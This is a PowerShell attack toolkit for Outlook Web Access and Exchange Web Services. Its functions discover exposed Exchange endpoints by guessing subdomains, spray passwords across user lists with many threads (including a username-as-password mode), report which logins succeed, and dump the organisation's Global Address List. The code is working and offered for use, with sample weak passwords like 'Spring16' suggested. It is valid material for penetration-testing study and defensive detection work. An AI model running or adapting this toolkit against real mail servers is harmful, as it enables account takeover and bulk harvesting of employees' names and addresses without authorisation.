# Toolkit for attacking OWA
# author @slobtresix0, @curi0usJack, @glitch1101, @porterhau5

#create a conf file and put its path in the send-notification function if you want notifications
#sample conf format:
#
#smtpServer = "10.10.10.10"
#notifyAddress = "email@email.com"
#

function Write-Message($message, $type)
{
	$s = ""
	switch ($type)
	{
		"error" 	{ $s = "[!] $message" }
		"success"	{ $s = "[+] $message" }
		default		{ $s = "[-] $message" }
	}
	Write-Host $s
}

function OTK-Init
{
#.Synopsis
#    This is a base cmd-let to produce an Exchange Web SErvice object
#    
#.Description
#    This script utilized the Exchange Web Service API provided by Microsoft to interact with an Exchange Web Service
#
#.PARAMETER Password
#    This is where you input the password you would like to use for the test. Something like Spring16 is usually a 
#    good choice.
#
#.PARAMETER ExchangeVersion
#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look
#    at the OWA page. Use "default" for Outlook.com/Office365.
#
#.PARAMETER dllPath
#    This is used to provide the path to the dll supplied by the Exchange Web Service installation.
#
#.PARAMETER ewsPath
#    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
#    
#.PARAMETER Domain
#    If set this parameter will append the domain to every user variable.
#
#.PARAMETER User
#    The User to authenticate with against the web service
#   
#.EXAMPLE
#    Creates an authencticated Exchange WEb Service object, can be used to intiate any methods exposed by the API
#    
#    $exchService = OTK-Init -Password "littlejohnny" -User "dbetty" -Domain "yourdomain.com" -ExchangeVersion 2007_SP1

	Param
	(

	  [Parameter(Mandatory=$false)]
	  [string]$Password,

	  [Parameter(Mandatory=$false)]
	  [string]$Email,
	  
	  [Parameter(Mandatory=$true)]
	  [string]$ExchangeVersion,

	  [Parameter(Mandatory=$false)]
	  [string]$dllPath,

	  [Parameter(Mandatory=$false)]
	  [string]$ewsPath,

	  [Parameter(Mandatory=$false)]
	  [switch]$CertCheck,

	  [Parameter(Mandatory=$false)]
	  [string]$User,

	  [Parameter(Mandatory=$false)]
	  [string]$Domain,

      [Parameter(Mandatory=$false)]
	  [string]$Brute,

      [Parameter(Mandatory=$false)]
	  [string]$UserMode,

      [Parameter(Mandatory=$false)]
	  [string]$UserPass,

      [Parameter(Mandatory=$false)]
	  [bool]$Notify

	)

	#attempt to import EWS api dll from EWS API
	if ($dllPath.Length -eq 0)
	{
	    Try 
	    {
	        if (Test-Path "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll")
            {
                $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.2\Microsoft.Exchange.WebServices.dll"
            }
            elseif (Test-Path "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll")
            {
                $dllPath = "C:\Program Files\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
            }
            elseif (Test-Path "C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll")
            {
                $dllPath = "C:\Program Files (x86)\Microsoft\Exchange\Web Services\2.1\Microsoft.Exchange.WebServices.dll"
            }
            else
            {
                Write-Warning "You need to install the Exchange Web Service API or check your Microsoft.Exchange.WebServices.dll path"
                Break
            }

	        Import-Module -Name $dllPath -ErrorAction Stop
	    }
	    Catch 
	    {
	        $ErrorMessage = $_.Exception.Message
	        Write-Warning "You need to install the Exchange Web Service API or check your Microsoft.Exchange.WebServices.dll path"
	        Break
	    }
	}
	else 
	{
	    Try 
	    {
            Import-Module -Name $dllPath -ErrorAction Stop
	    }
	    Catch 
	    {
	        $ErrorMessage = $_.Exception.Message
	        Write-Warning "You need to install the Exchange Web Service API or check your Microsoft.Exchange.WebServices.dll path"
	        Break
	    }
	}

	# setup version of Exchange to be attacked

	switch ($ExchangeVersion) 
    { 
        2007_SP1 {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2007_SP1} 
        2010 {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010} 
        2010_SP1 {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010_SP1} 
        2010_SP2 {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2010_SP2} 
        2013 {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013}  
        default {$exchVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::Exchange2013_SP1}
    }

	#setup EWS object
	$exchService = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($exchVersion)  

	#set implicit credentials
	$exchService.UseDefaultCredentials = $false

	#build credential object
    if ($Domain.Length -gt 1)
    {
        $User = $User + "@" + $Domain
    }

    # -UserPass
    if ($UserPass.Length -gt 1)
    {
        $pos = $User.IndexOf(":")
        $Password = $User.Substring($pos+1)
        $User = $User.Split(":")[0]
    }
    # -UserAsPass
    elseif ($UserMode.Length -gt 1)
    {
        $Password = $User.Split("@")[0]
    }

    $creds = New-Object System.Net.NetworkCredential($User,$Password)
    

    #add to exch service object
	$exchService.Credentials = $creds

    #change timeout to help speed
    $exchService.Timeout = 10000

	#output server version selected
	#write-host "[*] Attempting to attack version" $exchService.RequestedServerVersion

	#attempt to connect
	#write-host "[*] Starting connection..."

	#get path to EWS url
	if ($ewsPath.length -eq 0)
	{    
	    $exchService.AutodiscoverUrl($User,{$true})
	    #Write-Message "EWS not set, using EWS Path" $exchService.Url
	}
	else 
	{
	    $exchService.Url = [system.URI]$ewsPath
	    #Write-Message "Using EWS Path" $ewsPath
	}



	#return the intialized ews object
	#return $exchService

if ($Brute -eq $True)
{
    
    try
    {
    #test inbox
	$inboxFolderName = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox
	$inboxFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($exchService,$inboxFolderName)
    $unread = $inboxFolder.UnreadCount
    #$nothing = Send-Notification -Message "[*] Success! Authenticated with $User : $Password User has $unread unread emails."
    $output = "[*] Success! Authenticated with $User : $Password User has $unread unread emails."

    }
    catch
    {
       
       $ErrorMessage = $_.Exception.Message
       $output = "[!] Fail! With " + $User + ":" + $Password
         
    }


    return $output
}
else
{
    return $exchService
}

}

function Get-OWAVersion ($baseurl)
{
	#$baseurl should be in the format "https://server.domain.com"
	$owa = Invoke-WebRequest "$baseurl/owa/auth/logon.aspx"
	
	$xver = $owa.Headers['X-OWA-VERSION']
	if ($xver -ne $null)
	{
		if ($xver -match '^14\.')
			{ return "OWA_2010" }
		elseif ($xver -match '^8\.')
			{ return "OWA_2007" }
		else
			{ return "Unknown. X-OWA-VERSION: $xver" }
	}
	elseif ($owa.Content -match 'owa/auth/15\.' -or $owa.Content -match 'owa/15\.')
		{ return "OWA_2013" }
	else
		{ return "Unknown" }
}

function Steal-GAL
{
#.Synopsis
#    This is a  powershell script to enumerate and copy the Global Address List from an exposed Exchange Web Service
#    
#.Description
#    This script utilized the Exchange Web Service API provided by Microsoft to programattically scrap thru the GAL
#
#    
#.PARAMETER Password
#    This is where you input the password you would like to use for the test. Something like Spring16 is usually a 
#    good choice.
#
#.PARAMETER ExchangeVersion
#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look at the OWA page.
#
#.PARAMETER ewsPath
#    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
#    
#.PARAMETER Domain
#    If set this parameter will append the domain to every user variable.
#  
#.PARAMETER User
#    This is the user to authenticate with.
#
#.EXAMPLE
#    Initiates a connection to the EWS and pulls down the GAL
#
#    Steal-GAL -Password "littlejohnny" -User "dbetty" -domain "yourdomain.com" -ExchangeVersion 2007_SP1
#.EXAMPLE
#    Accepts an exchService object from the pipeline then pulls down the GAL
#    
#    OTK-Init -Password "littlejohnny" -User "dbetty" -Domain "yourdomain.com" -ExchangeVersion 2007_SP1 | Steal-GAL

    [CmdletBinding(DefaultParameterSetName="set1")]
    param (
        
        [parameter(ParameterSetName="set1")]  [string]$Password,
        [parameter(ParameterSetName="set1")]  [string]$ExchangeVersion,
        [parameter(ParameterSetName="set1")]  [string]$User,
        [parameter(ParameterSetName="set1")]  [string]$ewsPath,
        [parameter(ParameterSetName="set1")]  [string]$Domain,
        [parameter(ParameterSetName="set1")]  [string]$dllPath,
        [parameter(ParameterSetName="set2", Mandatory=$true,ValueFromPipeline=$true)] [object]$exchService
    )


#setup exchService if not passed from pipline
try
{
    if ($exchService.Url.length -lt 2)
    {
        $exchService = OTK-Init -Password $Password -User $User -ExchangeVersion $ExchangeVersion -ewsPath $ewsPath -Domain $Domain -dllPath $dllPath
    }
}
catch
{
    $ErrorMessage = $_.Exception.Message
}
#enumerate users in GAL

$alphaList=@()
65..90|foreach-object{$alphaList+=[char]$_}

#build object collection to store GAL info

$GAL_Full = @()


foreach ($layer1 in $alphaList)
{

    write-host "Making request for layer 1 " $layer1
    if($layer1 -eq "s") 
    {
    continue #everyrequest has SMTP in the response and it messes everything up
    }

    try
    {
        $response = $exchService.ResolveName($layer1,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
    }
    catch
    {
        write-host "Request Failed"
        Start-Sleep -s 10
        continue
    }
    if ($response.Count -ge 100)
    {

        write-host "Response is greater than 100, adding char to request"

        for ($i = 0; $i -lt $alphaList.length; $i++)
        {
            
            $layer2 = $layer1 + $alphaList[$i]
            
            write-host "Making request for layer 2 " $layer2

            try 
            {
                $response = $exchService.ResolveName($layer2,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
            }
            catch
            {
                write-host "Request Failed"
                Start-Sleep -s 10
                continue
            }
            if ($response.Count -ge 100)
            {

                write-host "Response is greater than 100, adding char to request again"

                for ($i = 0; $i -lt $alphaList.length; $i++)
                {
            
                    $layer3 = $layer2 + $alphaList[$i]
            
                    write-host "Making request for layer 3 " $layer3

                    try
                    {
                        $response = $exchService.ResolveName($layer3,[Microsoft.Exchange.WebServices.Data.ResolveNameSearchLocation]::DirectoryThenContacts,$true)
                    }
                    catch
                    {
                        write-host "Request Failed"
                        Start-Sleep -s 10
                        continue
                    }
                    foreach ($mailbox in $response)
                    {

                        foreach ($user in $mailbox)
                        {
                        write-host "Adding user " $mailbox.Mailbox.Name
                        $GAL = New-GAL
                        $GAL.Name = $mailbox.Mailbox.Name
                        $GAL.Email = $mailbox.Mailbox.Address
                        $GAL_Full += $GAL
                        }    
                    }
            
                }
            }
            else
            {
            
                foreach ($mailbox in $response)
                {

                    foreach ($user in $mailbox)
                    {
                    write-host "Adding user " $mailbox.Mailbox.Name
                    $GAL = New-GAL
                    $GAL.Name = $mailbox.Mailbox.Name
                    $GAL.Email = $mailbox.Mailbox.Address
                    $GAL_Full += $GAL
                    }    
                }
            }
        }
        
    }
    else
        {
            
                foreach ($mailbox in $response)
                {

                    foreach ($user in $mailbox)
                    {
                    write-host "Adding user " $mailbox.Mailbox.Name
                    $GAL = New-GAL
                    $GAL.Name = $mailbox.Mailbox.Name
                    $GAL.Email = $mailbox.Mailbox.Address
                    $GAL_Full += $GAL
                    }    
                }
        }
}


$GAL_Full = $GAL_Full | sort -Unique -Property Name

write-host "Extracted: " $GAL_Full.Count " users"

return $GAL_Full

}

function New-GAL 
{

New-Object PSObject -Property @{
        Name = ''
        Email = ''
    }

}

function New-Rules 
{

New-Object PSObject -Property @{
        Name = ''
        Id = ''
    }

}

function Search-Mailbox
{

}

function Add-Rule
{
#leverages outlook rules to perform various shenanigans





}

function Multi-Thread
{
#.Synopsis
#    This is a quick and open-ended script multi-threader searcher
#    
#.Description
#    This script will allow any general, external script to be multithreaded by providing a single
#    argument to that script and opening it in a seperate thread.  It works as a filter in the 
#    pipeline, or as a standalone script.  It will read the argument either from the pipeline
#    or from a filename provided.  It will send the results of the child script down the pipeline,
#    so it is best to use a script that returns some sort of object.
#
#    Authored by Ryan Witschger - http://www.Get-Blog.com
#    
#.PARAMETER Command
#    This is where you provide the PowerShell Cmdlet / Script file that you want to multithread.  
#    You can also choose a built in cmdlet.  Keep in mind that your script.  This script is read into 
#    a scriptblock, so any unforeseen errors are likely caused by the conversion to a script block.
#    
#.PARAMETER ObjectList
#    The objectlist represents the arguments that are provided to the child script.  This is an open ended
#    argument and can take a single object from the pipeline, an array, a collection, or a file name.  The 
#    multithreading script does it's best to find out which you have provided and handle it as such.  
#    If you would like to provide a file, then the file is read with one object on each line and will 
#    be provided as is to the script you are running as a string.  If this is not desired, then use an array.
#    
#.PARAMETER InputParam
#    This allows you to specify the parameter for which your input objects are to be evaluated.  As an example, 
#    if you were to provide a computer name to the Get-Process cmdlet as just an argument, it would attempt to 
#    find all processes where the name was the provided computername and fail.  You need to specify that the 
#    parameter that you are providing is the "ComputerName".
#
#.PARAMETER AddParam
#    This allows you to specify additional parameters to the running command.  For instance, if you are trying
#    to find the status of the "BITS" service on all servers in your list, you will need to specify the "Name"
#    parameter.  This command takes a hash pair formatted as follows:  
#
#    @{"ParameterName" = "Value"}
#    @{"ParameterName" = "Value" ; "ParameterTwo" = "Value2"}
#
#.PARAMETER AddSwitch
#    This allows you to add additional switches to the command you are running.  For instance, you may want 
#    to include "RequiredServices" to the "Get-Service" cmdlet.  This parameter will take a single string, or 
#    an aray of strings as follows:
#
#    "RequiredServices"
#    @("RequiredServices", "DependentServices")
#
#.PARAMETER MaxThreads
#    This is the maximum number of threads to run at any given time.  If resources are too congested try lowering
#    this number.  The default value is 20.
#    
#.PARAMETER SleepTimer
#    This is the time between cycles of the child process detection cycle.  The default value is 200ms.  If CPU 
#    utilization is high then you can consider increasing this delay.  If the child script takes a long time to
#    run, then you might increase this value to around 1000 (or 1 second in the detection cycle).
#
#    
#.EXAMPLE
#    Both of these will execute the script named ServerInfo.ps1 and provide each of the server names in AllServers.txt
#    while providing the results to the screen.  The results will be the output of the child script.
#    
#    gc AllServers.txt | .\Run-CommandMultiThreaded.ps1 -Command .\ServerInfo.ps1
#    .\Run-CommandMultiThreaded.ps1 -Command .\ServerInfo.ps1 -ObjectList (gc .\AllServers.txt)
#
#.EXAMPLE
#    The following demonstrates the use of the AddParam statement
#    
#    $ObjectList | .\Run-CommandMultiThreaded.ps1 -Command "Get-Service" -InputParam ComputerName -AddParam @{"Name" = "BITS"}
#    
#.EXAMPLE
#    The following demonstrates the use of the AddSwitch statement
#    
#    $ObjectList | .\Run-CommandMultiThreaded.ps1 -Command "Get-Service" -AddSwitch @("RequiredServices", "DependentServices")
#
#.EXAMPLE
#    The following demonstrates the use of the script in the pipeline
#    
#    $ObjectList | .\Run-CommandMultiThreaded.ps1 -Command "Get-Service" -InputParam ComputerName -AddParam @{"Name" = "BITS"} | Select Status, MachineName
#


Param($Command = $(Read-Host "Enter the script file"), 
    [Parameter(ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]$ObjectList,
    $InputParam = $Null,
    $MaxThreads = ((get-counter "\Processor(*)\% idle time").countersamples).length-1,
    $SleepTimer = 200,
    $MaxResultTime = 120,
    [HashTable]$AddParam = @{},
    [Array]$AddSwitch = @()
)

Begin{
    $ISS = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
    $RunspacePool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $ISS, $Host)
    $RunspacePool.Open()
        
   If ((Get-Command | Select-Object Name | ForEach {$_.name}) -contains $Command){
        $Code = $Null
    }Else{
        $OFS = "`r`n"
        $Code = [ScriptBlock]::Create($(Get-Content $Command))
        Remove-Variable OFS
    }
    $Jobs = @()
}

Process{
    Write-Progress -Activity "Preloading threads" -Status "Starting Job $($jobs.count)"
    ForEach ($Object in $ObjectList){
        If ($Code -eq $Null){
            $PowershellThread = [powershell]::Create().AddCommand($Command)
        }Else{
            $PowershellThread = [powershell]::Create().AddScript($Code)
        }
        If ($InputParam -ne $Null){
            $PowershellThread.AddParameter($InputParam, $Object.ToString()) | out-null
        }Else{
            $PowershellThread.AddArgument($Object.ToString()) | out-null
        }
        ForEach($Key in $AddParam.Keys){
            $PowershellThread.AddParameter($Key, $AddParam.$key) | out-null
        }
        ForEach($Switch in $AddSwitch){
            $Switch
            $PowershellThread.AddParameter($Switch) | out-null
        }
        $PowershellThread.RunspacePool = $RunspacePool
        $Handle = $PowershellThread.BeginInvoke()
        $Job = "" | Select-Object Handle, Thread, object
        $Job.Handle = $Handle
        $Job.Thread = $PowershellThread
        $Job.Object = $Object.ToString()
        $Jobs += $Job
    }
        
}

End{
    $ResultTimer = Get-Date
    While (@($Jobs | Where-Object {$_.Handle -ne $Null}).count -gt 0)  {
    
        $Remaining = "$($($Jobs | Where-Object {$_.Handle.IsCompleted -eq $False}).object)"
        If ($Remaining.Length -gt 60){
            $Remaining = $Remaining.Substring(0,60) + "..."
        }
        Write-Progress `
            -Activity "Waiting for Jobs - $($MaxThreads - $($RunspacePool.GetAvailableRunspaces())) of $MaxThreads threads running" `
            -PercentComplete (($Jobs.count - $($($Jobs | Where-Object {$_.Handle.IsCompleted -eq $False}).count)) / $Jobs.Count * 100) `
            -Status "$(@($($Jobs | Where-Object {$_.Handle.IsCompleted -eq $False})).count) remaining - $remaining" 

        ForEach ($Job in $($Jobs | Where-Object {$_.Handle.IsCompleted -eq $True})){
            $Job.Thread.EndInvoke($Job.Handle)
            $Job.Thread.Dispose()
            $Job.Thread = $Null
            $Job.Handle = $Null
            $ResultTimer = Get-Date
        }
        If (($(Get-Date) - $ResultTimer).totalseconds -gt $MaxResultTime){
            Write-Error "Child script appears to be frozen, try increasing MaxResultTime"
            Exit
        }
        Start-Sleep -Milliseconds $SleepTimer
        
    } 
    $RunspacePool.Close() | Out-Null
    $RunspacePool.Dispose() | Out-Null
} 
}

function Brute-EWS
{
#.Synopsis
#    This is a multi-threaded powershell script to brute force credentials by testing credentials against an Exchange Web Service
#    
#.Description
#    This script utilized the Exchange Web Service API provided by Microsoft to attempted multiple authentication transaction
#    against the web service endpoint. This script also requireds the Multi-Thread cmdlet and the version of exchange that you
#    are targeting. It is also worth noting that some exchange installations can authenticate with only the userid while
#    others can authenticate with the email.
#
#.PARAMETER Password
#    This is where you input the password you would like to use for the test. Something like Spring16 is usually a 
#    good choice.
#
#.PARAMETER TargetList
#    Txt file with a user per line. If the list includes the domain, ie "@blah.com", don't pass the domain parameter
#
#.PARAMETER ExchangeVersion
#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look at the OWA page.
#
#.PARAMETER dllPath
#    This is used to provide the path to the dll supplied by the Exchange WEb Service installation.
#
#.PARAMETER ewsPath
#    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
#    
#.PARAMETER Domain
#    If set this parameter will append the domain to every user variable.
#
#.PARAMETER UserasPass
#    Self explainatory and sad that it still works :(
#
#.PARAMETER UserPass
#    When this option is set, the TargetList should contain a username and password seperated by a colon (:), one pair per line
#    
#.EXAMPLE
#    Takes a list of userid and adds the domain, then attempted to authenticate with the password param
#
#    Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://webmail.yourdomain.com/EWS/Exchange.asmx" -Password "omg123" -Domain "yourdomain.com"
#.EXAMPLE
#    Takes a list of userids or emails and authenticates against the excahnge web service with the userid as the password
#    
#    Brute-EWS -TargetList .\userids.txt -ExchangeVersion 2007_SP1  -ewsPath "https://webmail.yourdomain.com/EWS/Exchange.asmx" -UserAsPass Yes

	Param
	(

	  [Parameter(Mandatory=$false)]
	  [string]$Password,

	  [Parameter(Mandatory=$true)]
	  [string]$TargetList,
	  
	  [Parameter(Mandatory=$true)]
	  [string]$ExchangeVersion,

	  [Parameter(Mandatory=$false)]
	  [string]$dllPath,

	  [Parameter(Mandatory=$false)]
	  [string]$ewsPath,

	  [Parameter(Mandatory=$false)]
	  [switch]$CertCheck,

	  [Parameter(Mandatory=$false)]
	  [string]$Domain,

      [Parameter(Mandatory=$false)]
	  [string]$UserAsPass,

      [Parameter(Mandatory=$false)]
	  [string]$UserPass,

      [Parameter(Mandatory=$false)]
	  [string]$PasswordList,

      [Parameter(Mandatory=$false)]
	  [bool]$Notify

	)

$Brute = $True
$cmdPath = $env:temp + "\OTK-Init.ps1" 

(Get-ChildItem function:OTK-Init).Definition | Out-File -FilePath $cmdPath

Multi-Thread -Command $cmdPath -ObjectList (get-content $TargetList) -InputParam "User" -AddParam @{"ExchangeVersion" = $ExchangeVersion ; "Password" = $Password;"ewsPath" = $ewsPath; "Domain" = $Domain; "Brute" = $Brute;"UserMode" = $UserAsPass; "dllPath" = $dllPath; "UserPass" = $UserPass}

}

function Scan-EWS
{

	Param
	(
       
	  [Parameter(Mandatory=$true)]
	  [string]$Domain

	)

#dirty hack for self-signed certificates
#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}


    $bruteDoms = "mail","exchange","webmail","mail","mail2","owa","mymail","secure","remote","seg","exchangeseg","autodiscover"

    foreach ($subdomain in $bruteDoms)
    {
         $target = $subdomain + "." + $domain
         Write-Verbose "[*] Resolving Target:$target"
         
         try
         {
            $result = [System.net.dns]::GetHostByName($target)
            [array]$results += $result.HostName
         }
         catch
         {
           Write-Verbose "Resolution Failed"
           continue
         }
    }

    foreach ($found in $results)
    {
      #write-host "[*] Found possible EWS subdomains:"
      #write-host "    [+]" $found
      #write-host "[*] Testing for EWS"
      try 
      {
        $ewsPath = "https://$found/EWS/Exchange.asmx"
        $request = [System.Net.WebRequest]::Create($ewsPath)
        $request.Timeout = 2000
        $response = $request.GetResponse()

      }
      catch
      {
        $responseCode = Failure($ewsPath)
        #write-host $responseCode "catch response code"
        if($responseCode -eq "401")
        {
          write-host "[*] Found Possible EWS at: $ewsPath"
        }
      }

    }

}

function Scan-MAPI
{

	Param
	(
       
	  [Parameter(Mandatory=$true)]
	  [string]$Domain

	)

#dirty hack for self-signed certificates
#[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}


    $bruteDoms = "mail","exchange","webmail","mail","mail2","owa","mymail","secure","remote","seg","exchangeseg","autodiscover"

    foreach ($subdomain in $bruteDoms)
    {
         $target = $subdomain + "." + $domain
         Write-Verbose "[*] Resolving Target:$target"
         
         try
         {
            $result = [System.net.dns]::GetHostByName($target)
            [array]$results += $result.HostName
         }
         catch
         {
           Write-Verbose "Resolution Failed"
           continue
         }
    }

    foreach ($found in $results)
    {
      #write-host "[*] Found possible EWS subdomains:"
      #write-host "    [+]" $found
      #write-host "[*] Testing for EWS"
      try 
      {
        $Path = "https://$found/mapi"
        $request = [System.Net.WebRequest]::Create($Path)
        $request.Timeout = 2000
        $response = $request.GetResponse()

      }
      catch
      {
        
        $responseCode = Failure($Path)
        #write-host $responseCode "catch response code"
        if($responseCode -eq "401")
        {
          write-host "[*] Found Possible MAPI at: $Path"
        }
      }

    }

}
function Failure 
{
    Param
	(
       
	  [Parameter(Mandatory=$false)]
	  [string]$Path

	)

  $exception = [string]$_

  if($exception -like "*error*")
  {
  $exceptionArray = $exception.split(":")
  #write-host $exceptionArray
  $responseCode = $exceptionArray[2].split(" ")[1]
  $responseCode = $responseCode.Replace("(","").Replace(")","")
  return $responseCode
  }
  else 
  {
    Write-Verbose "[-] Path: $Path $exception"
    return $responseCode = "connection fail"  
  }
}

function Send-Notification
{
    Param
	(
       
	  [Parameter(Mandatory=$true)]
	  [string]$Message

	)

    $confPath = "C:\programData\owa-toolkit\otk.conf"

    if(Test-Path $confPath)
    {
        #get things needed to send notification
        $conf = gc $confPath
        $smtpServer = $conf[0].split(" ")[2].replace('"',"")
        $notifyAddress = $conf[1].Split("")[2].replace('"',"")
        Send-MailMessage -From "owa_brute@brute.com" -SmtpServer $smtpServer -Subject $Message -To $notifyAddress
    }
}

function Display-Rules
{
#.Synopsis
#    Display the user's current mail rules
#    
#.Description
#    This script utilizes the Exchange Web Service API provided by Microsoft to interact with an Exchange Web Service
#
#.PARAMETER Password
#    Password of target user
#
#.PARAMETER ExchangeVersion
#    This is the version of exchange that you are targeting, use one of the other cmdlets to find this or just look
#    at the OWA page. Use "default" for Outlook.com/Office365.
#
#.PARAMETER dllPath
#    This is used to provide the path to the dll supplied by the Exchange Web Service installation.
#
#.PARAMETER ewsPath
#    Use this parameter to avoid sending a request to the autodiscover method or when autodiscover is unavailable.
#    
#.PARAMETER Domain
#    If set this parameter will append the domain to the user variable.
#
#.PARAMETER User
#    The User to authenticate with against the web service
#   
#.EXAMPLE
#    Display-Rules -Password "littlejohnny" -User "dbetty@outlook.com" -ewsPath "https://outlook.com/EWS/Exchange.asmx" -ExchangeVersion default

	Param
	(

	  [Parameter(Mandatory=$false)]
	  [string]$Password,

	  [Parameter(Mandatory=$false)]
	  [string]$Email,
	  
	  [Parameter(Mandatory=$true)]
	  [string]$ExchangeVersion,

	  [Parameter(Mandatory=$false)]
	  [string]$dllPath,

	  [Parameter(Mandatory=$false)]
	  [string]$ewsPath,

	  [Parameter(Mandatory=$false)]
	  [switch]$CertCheck,

	  [Parameter(Mandatory=$false)]
	  [string]$User,

	  [Parameter(Mandatory=$false)]
	  [string]$Domain,

      [Parameter(Mandatory=$false)]
	  [string]$Brute,

      [Parameter(Mandatory=$false)]
	  [string]$UserMode,

      [Parameter(Mandatory=$false)]
	  [bool]$Notify

	)

$Rules = @()

#setup exchService if not passed from pipeline
try
{
    if ($exchService.Url.length -lt 2)
    {
        $exchService = OTK-Init -Password $Password -User $User -ExchangeVersion $ExchangeVersion -ewsPath $ewsPath -Domain $Domain -dllPath $dllPath
    }
}
catch
{
    $ErrorMessage = $_.Exception.Message
}

$inboxRules = $exchService.GetInboxRules()

Write-Host "Rules: "
foreach ($rule in $inboxRules)
{
    Write-Host "  Name: " $rule.DisplayName ", Id: " $rule.Id
    $tmpRule = New-Rules
    $tmpRule.Name = $rule.DisplayName
    $tmpRule.Id = $rule.Id
    $Rules += $tmpRule
}

return $Rules

}

Export-ModuleMember OTK-Init
Export-ModuleMember Get-ewsPath
Export-ModuleMember Get-owaPath
Export-ModuleMember Multi-Thread
Export-ModuleMember Brute-EWS
Export-ModuleMember Write-Message
Export-ModuleMember Get-OWaVersion
Export-ModuleMember Steal-GAL
Export-ModuleMember New-GAL
Export-ModuleMember Scan-MAPI
Export-ModuleMember Scan-EWS
Export-ModuleMember Send-Notification
Export-ModuleMember Failure
Export-ModuleMember Display-Rules
